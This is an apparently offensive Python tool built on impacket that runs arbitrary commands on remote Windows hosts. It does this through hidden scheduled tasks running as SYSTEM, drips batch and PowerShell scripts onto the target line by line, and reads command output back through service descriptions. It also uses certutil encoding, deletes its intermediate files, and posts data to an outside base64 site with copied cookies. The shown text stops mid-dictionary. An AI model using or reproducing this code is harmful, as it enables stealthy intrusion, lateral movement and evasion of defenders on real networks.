from __future__ import division
from __future__ import print_function

import base64
import re
import shutil
import sys
import os
import cmd
import argparse
import time
import logging
import ntpath
import traceback
from base64 import b64encode
from binascii import a2b_hex

import requests
from impacket.dcerpc.v5 import scmr, atsvc, tsch
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.scmr import hROpenSCManagerW, hRCreateServiceW, SERVICE_DEMAND_START, hRCloseServiceHandle, \
    hRChangeServiceConfigW, hRDeleteService, RQueryServiceConfig2W, DCERPCSessionError, hRStartServiceW
from impacket.dcerpc.v5.tsch import hSchRpcHighestVersion
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, system_errors
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.krb5.keytab import Keytab
from six import PY2
from impacket.dcerpc.v5.epm import hept_map
from impacket.uuid import uuidtup_to_bin


import random
import string
import errno, os
certutil_is_already_faked=False
# Sadly, Python fails to provide the following magic number for us.
ERROR_INVALID_NAME = 123
def is_pathname_valid(pathname: str) -> bool:
    '''
    `True` if the passed pathname is a valid pathname for the current OS;
    `False` otherwise.
    '''
    # If this pathname is either not a string or is but is empty, this pathname
    # is invalid.
    try:
        if not isinstance(pathname, str) or not pathname:
            return False

        # Strip this pathname's Windows-specific drive specifier (e.g., `C:\`)
        # if any. Since Windows prohibits path components from containing `:`
        # characters, failing to strip this `:`-suffixed prefix would
        # erroneously invalidate all valid absolute Windows pathnames.
        _, pathname = os.path.splitdrive(pathname)

        # Directory guaranteed to exist. If the current OS is Windows, this is
        # the drive to which Windows was installed (e.g., the "%HOMEDRIVE%"
        # environment variable); else, the typical root directory.
        root_dirname = os.environ.get('HOMEDRIVE', 'C:') \
            if sys.platform == 'win32' else os.path.sep
        assert os.path.isdir(root_dirname)   # ...Murphy and her ironclad Law

        # Append a path separator to this directory if needed.
        root_dirname = root_dirname.rstrip(os.path.sep) + os.path.sep

        # Test whether each path component split from this pathname is valid or
        # not, ignoring non-existent and non-readable path components.
        for pathname_part in pathname.split(os.path.sep):
            try:
                os.lstat(root_dirname + pathname_part)
            # If an OS-specific exception is raised, its error code
            # indicates whether this pathname is valid or not. Unless this
            # is the case, this exception implies an ignorable kernel or
            # filesystem complaint (e.g., path not found or inaccessible).
            #
            # Only the following exceptions indicate invalid pathnames:
            #
            # * Instances of the Windows-specific "WindowsError" class
            #   defining the "winerror" attribute whose value is
            #   "ERROR_INVALID_NAME". Under Windows, "winerror" is more
            #   fine-grained and hence useful than the generic "errno"
            #   attribute. When a too-long pathname is passed, for example,
            #   "errno" is "ENOENT" (i.e., no such file or directory) rather
            #   than "ENAMETOOLONG" (i.e., file name too long).
            # * Instances of the cross-platform "OSError" class defining the
            #   generic "errno" attribute whose value is either:
            #   * Under most POSIX-compatible OSes, "ENAMETOOLONG".
            #   * Under some edge-case OSes (e.g., SunOS, *BSD), "ERANGE".
            except OSError as exc:
                if hasattr(exc, 'winerror'):
                    if exc.winerror == ERROR_INVALID_NAME:
                        return False
                elif exc.errno in {errno.ENAMETOOLONG, errno.ERANGE}:
                    return False
    # If a "TypeError" exception was raised, it almost certainly has the
    # error message "embedded NUL character" indicating an invalid pathname.
    except TypeError as exc:
        return False
    # If no exception was raised, all path components and hence this
    # pathname itself are valid. (Praise be to the curmudgeonly python.)
    else:
        return True
    # If any other exception was raised, this is an unrelated fatal issue
    # (e.g., a bug). Permit this exception to unwind the call stack.
    #
    # Did we mention this should be shipped with Python already?
def is_path_creatable(pathname: str) -> bool:
    '''
    `True` if the current user has sufficient permissions to create the passed
    pathname; `False` otherwise.
    '''
    # Parent directory of the passed path. If empty, we substitute the current
    # working directory (CWD) instead.
    dirname = os.path.dirname(pathname) or os.getcwd()
    return os.access(dirname, os.W_OK)
def is_path_exists_or_creatable(pathname: str) -> bool:
    '''
    `True` if the passed pathname is a valid pathname for the current OS _and_
    either currently exists or is hypothetically creatable; `False` otherwise.

    This function is guaranteed to _never_ raise exceptions.
    '''
    try:
        # To prevent "os" module calls from raising undesirable exceptions on
        # invalid pathnames, is_pathname_valid() is explicitly called first.
        return is_pathname_valid(pathname) and (
                os.path.exists(pathname) or is_path_creatable(pathname))
    # Report failure on non-fatal filesystem complaints (e.g., connection
    # timeouts, permissions issues) implying this path to be inaccessible. All
    # other exceptions are unrelated fatal issues and should not be caught here.
    except OSError:
        return False
packet_delay=0
there_is_no_need_to_get_echo_back=False

def wrap_cmd_exec(tschctl='tschctl',command='command',schtasks_name='schtasks_name',finish_mark=''):

    # command = f"{fake_certutil_name}.exe -f -decode {sch_backup_filename} {dest_path}.txt&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""

    # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
    wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
    tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

    while True:
        time.sleep(0.5)
        motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
        if motherfucker == '':
            continue
        if motherfucker.split(finish_mark, 1).__len__() >= 2:
            print("cmd execution finished, trying to get echo back...")
            break
def retrive_service_description(svcctl, hService,bat_gen_bat_prefix,my_codec='',unicode_is_coming=True):
    config2response = hRQueryServiceConfig2W(svcctl, hService)
    buffer_content = config2response['lpBuffer']
    what_the_fuck = b''.join(buffer_content)
    print("UNICODE fucker: ")
    #print(what_the_fuck)

    if not unicode_is_coming:
        raw_unicode = what_the_fuck.decode(my_codec)
        motherfucker = ''
        iasdasd = 0
        for i in raw_unicode:
            iasdasd = iasdasd + 1
            if iasdasd % 2 == 0:
                continue
            motherfucker = motherfucker + i
        print('++++++++++++++++++++'+motherfucker+'--------'+bat_gen_bat_prefix+'++++++++++++++++++++')
        try:
            asdasdasad=motherfucker.split(bat_gen_bat_prefix,1)[1].split(bat_gen_bat_prefix,1)[0]
            return asdasdasad
        except Exception as e:
            return ''
    # 前面3个字节扔掉，然后找到
    # iasdasd = 0
    # final_butes=b''
    # preI=''
    # for i in what_the_fuck:
    #     iasdasd = iasdasd + 1
    #     if iasdasd % 2 == 0:
    #         final_butes= final_butes+ bytes([i])+ bytes([preI])
    #     else:
    #         preI=i

    motherfucker = what_the_fuck.decode('utf-16le')

    print('++++++++++++++++++++'+motherfucker+'--------'+bat_gen_bat_prefix+'++++++++++++++++++++')
    try:
        asdasdasad=motherfucker.split(bat_gen_bat_prefix,1)[1].split(bat_gen_bat_prefix,1)[0]
        return asdasdasad
    except Exception as e:
        return ''

def get_echo_back(svcctl,hService,bat_gen_bat_prefix,execution_count,tschctl,schtasks_name):
    final_string=''
    for i in range(execution_count):
        wrap_hSchRpcRegisterTask(tschctl, command=bat_gen_bat_prefix+ str(i + 1)+'.bat', schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
        while True:
            #time.sleep(packet_delay)
            motherfucker = retrive_service_description(svcctl, hService, bat_gen_bat_prefix,my_codec=my_codec)
            if motherfucker=='':
                continue
            # 这个地方虚高1，需要减掉
            print("WHAT THE FUCK---------------------")
            print(motherfucker)
            if len(motherfucker.split('mockcount',1))<2:
                continue
            if int(motherfucker.split('mockcount',1)[1])-1==i+1:
                # 编号对应，则说明已经成功写入，累加到结果字符串中即可
                final_string=final_string+motherfucker.split('mockcount',1)[0]+'\n'
                break

    print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++')
    print(final_string)
    print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++')

def xml_escape(data):
    replace_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    return ''.join(replace_table.get(c, c) for c in data)

def delete_bat_gen_file(bat_prefix,servicename='',hService='',schtasks_name='',svcctl='',tschctl=''):
    finish_mark=generate_random_string(5)
    command = f'del %s*&&C:\windows\system32\sc.exe description %s "{bat_gen_bat_prefix}%s{bat_gen_bat_prefix}"' % (bat_prefix,servicename,finish_mark)
    wrap_hSchRpcRegisterTask(tschctl,command=command,schtasks_name=schtasks_name,action=tsch.TASK_UPDATE)
    tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

    while True:
        #time.sleep(packet_delay)
        print(f'????????????????????DELETE bat gen file {bat_prefix}* with mark {finish_mark}??????????????????????')
        motherfucker = retrive_service_description(svcctl, hService, bat_gen_bat_prefix,my_codec=my_codec)
        if motherfucker=='':
            continue
        if motherfucker.split(finish_mark, 1).__len__() >= 2:
            #print("cmd execution finished, trying to get echo back...")
            return

        #print("waiting for cmd execution finish...")
#def delete_inter_file(bat_file_name,bat_source_file_name,tschctl='', bat_gen_bat_prefix='',schtasks_name='',servicename='',svcctl='',hService='',my_codec=''):

def delete_inter_file(bat_file_name='',copied_xml_file_name='xml_file_name',file_part_1_name='file_part_1_name',
                      desc_header_file_name='desc_header_file_name',desc_tail_file_name='desc_tail_file_name',
                      cmd_result_file_name='cmd_result_file_name',new_xml_file='new_xml_file',
                      sch_backup_filename='sch_backup_filename',    fake_certutil_name = 'fake_certutil_name',
                      split_out_dir_on_target='split_out_dir_on_target',
                      servicename='lpServiceName',hService='hService',svcctl='svcctl',tschctl='tschctl',  ps_file_name='ps_file_name',schtasks_name='schtasks_name',service_desc_marker='service_desc_marker'):

    finish_mark=generate_random_string(5)
    split_out_dir_on_target=''
    if split_out_dir_on_target=='':
        command = f'del {sch_backup_filename};{fake_certutil_name};{bat_file_name}.bat;{copied_xml_file_name};{file_part_1_name};{desc_header_file_name};{desc_tail_file_name};{cmd_result_file_name};{cmd_result_file_name}1;{new_xml_file};{new_xml_file}1;{ps_file_name}.ps1;{new_xml_file}2&&C:\windows\system32\sc.exe description {servicename} "{service_desc_marker}{finish_mark}{service_desc_marker}"'
    else:
        command = f'del {sch_backup_filename};{fake_certutil_name };{bat_file_name}.bat;{copied_xml_file_name};{file_part_1_name};{desc_header_file_name};{desc_tail_file_name};{cmd_result_file_name};{cmd_result_file_name}1;{new_xml_file};{new_xml_file}1;{new_xml_file}2&&del /q {split_out_dir_on_target}\\*&&rd /q {split_out_dir_on_target}&&C:\windows\system32\sc.exe description {servicename} "{service_desc_marker}{finish_mark}{service_desc_marker}"'
    wrap_hSchRpcRegisterTask(tschctl,command=command,schtasks_name=schtasks_name,action=tsch.TASK_UPDATE)
    tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)

    while True:
        time.sleep(0.5)
        print(f"???????????????????DELETE bat and res file")# {bat_file_name}-----{bat_source_file_name}with mark {finish_mark}?????????????????????????????")
        motherfucker = retrive_service_description(svcctl, hService, service_desc_marker,my_codec=my_codec)
        if motherfucker=='':
            continue
        if motherfucker.split(finish_mark, 1).__len__() >= 2:
            #print("cmd execution finished, trying to get echo back...")
            return

        #print("waiting for cmd execution finish...")
def write_pwershell(svcctl='', hService='', schtasks_name='', service_name='', service_desc_marker='', ps_file_name='', encoded_file_name='',out_dir=''):
    ps_content = """function Get-Domain {$inputFile = "1.txt";$outputPrefix = "outdir\output";$chunkSize = 1MB;$index = 1;$stream = New-Object System.IO.FileStream($inputFile, [System.IO.FileMode]::Open)
$reader = New-Object System.IO.BinaryReader($stream);while ($true) {$chunk = $reader.ReadBytes($chunkSize);if ($chunk.Length -eq 0) { break }
$outputFile = "{0}_{1:0000}" -f $outputPrefix, $index;$index++;Set-Content -Path $outputFile -Value $chunk -Encoding Byte;};$reader.Close();$stream.Close();$c="cmd /c sc description qwer sdgfdfdsfdffinishmark";$d="sdgfdfdsfdf";$cc="{0}{1}{2}" -f $c,$index,$d;Invoke-Expression $cc}"""
    # 需要替换输入文件1.txt，输出目录outdir，
    finisssssh_mark=generate_random_string(5)
    ps_content = ps_content.replace('1.txt', encoded_file_name)
    ps_content = ps_content.replace('outdir', out_dir)
    ps_content = ps_content.replace('qwer', service_name)
    ps_content = ps_content.replace('sdgfdfdsfdf', service_desc_marker)
    ps_content = ps_content.replace('finishmark', finisssssh_mark)

    count = 0
    for line in ps_content.splitlines():
        count = count + 1
        finish_mark = generate_random_string(5)
        command = "echo %s>>%s.ps1&&sc description %s \"%s\"" % (
            line, ps_file_name, service_name, service_desc_marker + finish_mark + service_desc_marker)
        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
        while True:
            time.sleep(0.5)
            print(f'?????????????????????EXECUTING {count} line makr with {finish_mark}????????????????????????')
            motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
            if motherfucker == '':
                continue
            if motherfucker.split(finish_mark, 1).__len__() >= 2:
                # print("cmd execution finished, trying to get echo back...")
                break

            # print("waiting for cmd execution finish...")
    return finisssssh_mark


def write_bat(svcctl='', hService='', schtasks_name='', service_name='', service_desc_marker='',
              file_part_1_name='', bat_file_name='', copied_xml_name='',desc_header_file_name='',
              desc_tail_file_name=''):
    # 转义后的脚本

    bat_content="""@echo off ^&^&setlocal EnableDelayedExpansion^&^&copy tasks\\schtasks_name xml.xml^&^& set /a linenumber=45 ^&^& set destfile=file_part_1_file ^&^& set inputfile=xml.xml
set count=0 ^&^& for /f "tokens=* delims=" ^%^%a in ('type "%inputfile%"') do (
set /a count+=1 ^&^& if !linenumber! LEQ !count! (set /a random=1) else (echo ^%^%a ^>^> !destfile!))
echo ^^^<Description^^^>^>description_header^&^&echo ^^^</Description^^^>^^^</RegistrationInfo^^^>^^^</Task^^^>^>description_tail^&^& sc description servicename finishmark"""
    # 替换掉服务名称
    bat_content = bat_content.replace('servicename', service_name)
    bat_content = bat_content.replace('schtasks_name', schtasks_name)
    bat_content = bat_content.replace('xmlname', copied_xml_name)
    # 替换掉计划任务的xml文件拷贝文件名称
    bat_content = bat_content.replace('xml.xml', copied_xml_name)
    # 替换掉服务描述值
    bat_finish_mark =generate_random_string(5)
    bat_content = bat_content.replace('finishmark', service_desc_marker + bat_finish_mark + service_desc_marker)
    # 替换掉组合文件的第一部分文件名
    bat_content = bat_content.replace('file_part_1_file', file_part_1_name)
    bat_content = bat_content.replace('description_tail', desc_tail_file_name)
    bat_content = bat_content.replace('description_header', desc_header_file_name)

    count=0
    for line in bat_content.splitlines():
        count=count+1
        finish_mark=generate_random_string(5)
        command = "echo %s>>%s.bat&&sc description %s \"%s\"" % (line,bat_file_name,service_name,service_desc_marker + finish_mark + service_desc_marker)
        wrap_hSchRpcRegisterTask(tschctl,command=command,schtasks_name=schtasks_name,action=tsch.TASK_UPDATE)
        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
        while True:
            time.sleep(0.5)
            print(f'?????????????????????EXECUTING {count} line makr with {finish_mark}????????????????????????')
            motherfucker = retrive_service_description(svcctl, hService, service_desc_marker,my_codec=my_codec)
            if motherfucker=='':
                continue
            if motherfucker.split(finish_mark, 1).__len__() >= 2:
                #print("cmd execution finished, trying to get echo back...")
                break

            #print("waiting for cmd execution finish...")
    return bat_finish_mark


def wrap_upload_hSchRpcRegisterTask(tschctl, encoded_string = 'encoded_string', sch_backup_filename='sch_backup_filename',lpServiceName='lpServiceName',service_desc_marker='preix',finish_mark='',schtasks_name = 'schtasks_name', action=tsch.TASK_UPDATE):



    cmd = "cmd.exe"



    #args = "/C %s > %%windir%%\\Temp\\%s 2>&1 && certutil -f -encode %s %s" % (command, result_file_name,
    # result_file_name,encoded_file_name)
    args='/c copy tasks\\%s %s&&sc description %s "%s + %s + %s"' % (schtasks_name,sch_backup_filename,lpServiceName,service_desc_marker,finish_mark,service_desc_marker)

    xml = """<?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <Triggers>
            <CalendarTrigger>
              <StartBoundary>9999-07-15T20:35:13.2757294</StartBoundary>
              <Enabled>true</Enabled>
              <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
              </ScheduleByDay>
            </CalendarTrigger>
          </Triggers>
          <Principals>
            <Principal id="LocalSystem">
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
          <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>true</AllowHardTerminate>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
              <StopOnIdleEnd>true</StopOnIdleEnd>
              <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>false</WakeToRun>
            <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
            <Priority>7</Priority>
          </Settings>
          <Actions Context="LocalSystem">
            <Exec>
              <Command>%s</Command>
              <Arguments>%s</Arguments>
            </Exec>
          </Actions> <RegistrationInfo>
    <URI>\pbieo</URI>
    <Description>-----BEGIN CERTIFICATE-----%s-----END CERTIFICATE-----</Description>
  </RegistrationInfo>
        </Task>
                """ % ((xml_escape(cmd)),
                       (xml_escape(args)),
                       (xml_escape(encoded_string)))
    taskCreated = False
    tsch.hSchRpcRegisterTask(tschctl, '\\%s' % schtasks_name, xml, action, NULL, tsch.TASK_LOGON_NONE)

def wrap_hSchRpcRegisterTask(tschctl,command,result_file_name='',encoded_file_name='',schtasks_name="",action=tsch.TASK_CREATE):
    cmd = "cmd.exe"



    #args = "/C %s > %%windir%%\\Temp\\%s 2>&1 && certutil -f -encode %s %s" % (command, result_file_name,
    # result_file_name,encoded_file_name)
    args='/c %s'%command

    xml = """<?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <Triggers>
            <CalendarTrigger>
              <StartBoundary>9999-07-15T20:35:13.2757294</StartBoundary>
              <Enabled>true</Enabled>
              <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
              </ScheduleByDay>
            </CalendarTrigger>
          </Triggers>
          <Principals>
            <Principal id="LocalSystem">
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
          <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>true</AllowHardTerminate>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
              <StopOnIdleEnd>true</StopOnIdleEnd>
              <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>false</WakeToRun>
            <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
            <Priority>7</Priority>
          </Settings>
          <Actions Context="LocalSystem">
            <Exec>
              <Command>%s</Command>
              <Arguments>%s</Arguments>
            </Exec>
          </Actions> <RegistrationInfo>
    <URI>\pbieo</URI>
  </RegistrationInfo>
        </Task>
                """ % ((xml_escape(cmd)),
                       (xml_escape(args)))
    taskCreated = False
    tsch.hSchRpcRegisterTask(tschctl, '\\%s' % schtasks_name, xml, action, NULL, tsch.TASK_LOGON_NONE)

def wrapper_hRStartServiceW(svcctl, hService):
    try:
        hRStartServiceW(svcctl, hService)
    except Exception as e:
        # 如果是服务响应超时，则不认为是错误
        if e.error_code == 1053:
            return True
        print("[-] error occured")
        print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
        print(e)
        print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
        return False
"""
BOOL QueryServiceConfig2W(
  [in]            SC_HANDLE hService,
  [in]            DWORD     dwInfoLevel,
  [out, optional] LPBYTE    lpBuffer,
  [in]            DWORD     cbBufSize,
  [out]           LPDWORD   pcbBytesNeeded
);
BOOL QueryServiceConfigW(
  [in]            SC_HANDLE               hService,
  [out, optional] LPQUERY_SERVICE_CONFIGW lpServiceConfig,
  [in]            DWORD                   cbBufSize,
  [out]           LPDWORD                 pcbBytesNeeded
);
"""
def hRQueryServiceConfig2W(dce, hService):
    queryService = RQueryServiceConfig2W()
    queryService['hService'] = hService
    queryService['cbBufSize'] = 1024
    queryService['dwInfoLevel']=1
    try:
        resp = dce.request(queryService)
    except DCERPCSessionError as e:
        if e.get_error_code() == system_errors.ERROR_INSUFFICIENT_BUFFER:
            resp = e.get_packet()
            print(f"buffersize: {resp['pcbBytesNeeded']}")
            queryService['cbBufSize'] = resp['pcbBytesNeeded']
            resp = dce.request(queryService)
        else:
            raise

    return resp

remove_new_line_bat_template = """@echo off
setlocal EnableDelayedExpansion
set row=
for /f %%x in (4.txt) do set "row=!row!%%x"
sc description qwer "%row%\""""

service_bin_path_template = 'C:\windows\system32\cmd.exe /c echo QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24Kc2V0IHJvdz0KZm9yIC9mICUleCBpbiAoNC50eHQpIGRvIHNldCAicm93PSFyb3chJSV4IgplY2hvICVyb3clID5uZXdmaWxlLnR4dAplY2hvICVyb3cl>2.txt&&certutil -f -decode 2.txt 2.bat&&echo ZWNobyAyMyA+QzpcdXNlcnNccHVibGljXGRvd25sb2Fkc1wxMjM0NS50eHQ=>0.txt&&certutil -f -decode 0.txt 1.bat&&type 1.bat>2.txt&&copy /y 2.txt 1.bat&&1.bat>3.txt 2>&1&&certutil -f -encode 3.txt 4.txt&&2.bat&&del 1.txt;2.txt;1.bat;2.bat;4.txt;newfile.txt;3.txt;0.txt'

def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
def b64DecodeAPI(srcStr,my_codec):
    aaamy_codec=my_codec
    if my_codec=='GBK':
        aaamy_codec='GB18030'
    # print(f"{bcolors.OKBLUE}[*] encode text: \n{srcStr}{bcolors.ENDC}")
    cookies = {
        '_ga': 'GA1.2.382353072.1668334362',
        '_gid': 'GA1.2.1481584565.1668334362',
        '__gads': 'ID=7e87b6a44e7646bc:T=1668334366:S=ALNI_MaRQ2o2-uzGdTnm_MKghGVadUrLqw',
        '__gpi': 'UID=00000b7b1b1db821:T=1668334366:RT=1668411275:S=ALNI_MZ2guNzJXE_M3tWVK-9v88S3PLDhg',
        'cto_bundle': 'cjdx2V9TU3RWQ3dES1F4NFJiRndjWDh5UFJjT1Y2OHRXaGtmanUwa3c4NEM5TE1vV0RRZ3hveDBMJTJCMUZOVDAwZlVjbmtDdiUyQndPeER3UnQ0VmtUbkExWVhFQ25veTZvMWo2dEFIaiUyQjc5MTRONXFka0NhMUlLWSUyQkt6a0pSQUZnTzhLZ0xBZ3R5N1NKSSUyRlRnNG50aTBGa00wcmx2bkVUMm0wMiUyRmQ0UHhsMlFnS3FrSHMlM0Q',
        'OPTIONS': '{%22option_text_charset%22:%22UTF-8%22%2C%22option_text_newlines%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}',
    }

    headers = {
        'authority': 'www.base64decode.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.382353072.1668334362; _gid=GA1.2.1481584565.1668334362; __gads=ID=7e87b6a44e7646bc:T=1668334366:S=ALNI_MaRQ2o2-uzGdTnm_MKghGVadUrLqw; __gpi=UID=00000b7b1b1db821:T=1668334366:RT=1668411275:S=ALNI_MZ2guNzJXE_M3tWVK-9v88S3PLDhg; cto_bundle=cjdx2V9TU3RWQ3dES1F4NFJiRndjWDh5UFJjT1Y2OHRXaGtmanUwa3c4NEM5TE1vV0RRZ3hveDBMJTJCMUZOVDAwZlVjbmtDdiUyQndPeER3UnQ0VmtUbkExWVhFQ25veTZvMWo2dEFIaiUyQjc5MTRONXFka0NhMUlLWSUyQkt6a0pSQUZnTzhLZ0xBZ3R5N1NKSSUyRlRnNG50aTBGa00wcmx2bkVUMm0wMiUyRmQ0UHhsMlFnS3FrSHMlM0Q; OPTIONS={%22option_text_charset%22:%22UTF-8%22%2C%22option_text_newlines%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}',
        'origin': 'https://www.base64decode.org',
        'referer': 'https://www.base64decode.org/',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    }

    data = {
        'input': srcStr,
        'charset': aaamy_codec,
    }
    proxies={
        'http':'127.0.0.1:7890',
        'https':'127.0.0.1:7890',
    }
    # response = requests.post('https://www.base64decode.org/', cookies=cookies, headers=headers, data=data)
    response = requests.post('https://www.base64decode.org/', cookies=cookies, headers=headers, data=data)#,proxies=proxies)

    print(convertTuple(re.findall(r"<textarea name=\"output\".*?\"height:220px;\">((.|\n)*?)</textarea>", response.text)[0]).replace("&gt;",">").replace("&quot;", '"').replace("&#039;", '"'))

def encodeAPI(cmdOrder,my_codec):

    cookies = {
        '_uc_referrer': 'https://www.google.com/',
        '_pbjs_userid_consent_data': '3524755945110770',
        '__qca': 'P0-343750202-1668246808037',
        '_tfpvi': 'YThkY2NhZTUtOTkyMS00NTQyLWFiYTAtNGMxYjgxN2M0MTY0Iy02LTQ%3D',
        '_lr_env_src_ats': 'false',
        '_cc_id': 'b00c47f836abdf146bdc7beb6bea3bab',
        '_au_1d': 'AU1D-0100-001668246816-O5S5WUIL-T6AU',
        '_au_last_seen_iab_tcf': '1668246817108',
        '_fbp': 'fb.1.1668246820488.322481334',
        '_ga': 'GA1.2.37428437.1668334356',
        'OPTIONS': '{%22option_text_charset%22:%22UTF-8%22%2C%22option_text_separator%22:%22lf%22%2C%22option_file_charset%22:%22BINARY%22%2C%22option_file_separator%22:%22lf%22%2C%22option_text_newlines%22:%22off%22%2C%22option_text_chunks%22:%22off%22%2C%22option_text_urlsafe%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_file_chunks%22:%22off%22%2C%22option_file_urlsafe%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}',
        '__gads': 'ID=80dd962c4e12ca05:T=1668246815:S=ALNI_MaQh_UhYSGdAZ5fNo4tNi2WFPr2kA',
        'cto_bidid': 'HokRnl90JTJGSHV1VXhGVHR1dE9wUlFhZ1hpcFRFY2h1VVlWaXFQOThGJTJGMUd2SHM2Sk92cGNZVVY2NHBPUW1HejI2UjZhWFRiTFE0N0dUUWFwMWppeiUyQnRibW91JTJCZ0JBZ09XQTBKVFNKYk5uaGd2eVo5ZlllTkd4Q3Q5dEpBSXFWZUl4MmZv',
        '_gid': 'GA1.2.996041912.1668690088',
        'pbjs_li_nonid': '%7B%7D',
        '_au_last_seen_pixels': 'eyJhcG4iOjE2Njg2OTAwOTQsInR0ZCI6MTY2ODY5MDA5NCwicHViIjoxNjY4NjkwMDk0LCJhZHgiOjE2Njg2OTAwOTQsImdvbyI6MTY2ODY5MDA5NCwic21hcnQiOjE2Njg2OTAxMDIsInBwbnQiOjE2Njg2OTAwOTQsIm1lZGlhbWF0aCI6MTY2ODY5MDEwMiwic29uIjoxNjY4NjkwMDk0LCJhZG8iOjE2Njg2OTAwOTQsInRhYm9vbGEiOjE2Njg2OTAwOTQsImltcHIiOjE2Njg2OTAxMDIsImJlZXMiOjE2Njg2OTAwOTQsInJ1YiI6MTY2ODY5MDEwMiwib3BlbngiOjE2Njg2OTAxMDIsInVucnVseSI6MTY2ODY5MDEwMn0=',
        'cto_bundle': 'PaVk-l9DUmhSb0o1RGJzcDI0dkhMSmJuJTJGU2d1bEl0Qk1qeUZ3YWlGQnZoN01UZ0pNQjF3dDhJM2FWU3kxN00xVkE5M3VOSUgxQVMyWGh4QkUlMkJUS0RvdGZtbnZQRHglMkJac095bFJWV3lNUXN5allwN3A0ODF6VmxwMmk4bkpoVzZMNjhYMiUyRmlzTXIwbXFCUiUyQkozOWk3bjBZUEtJbFZNeUNCdVFNTGphQW8zdzd1MVVzJTNE',
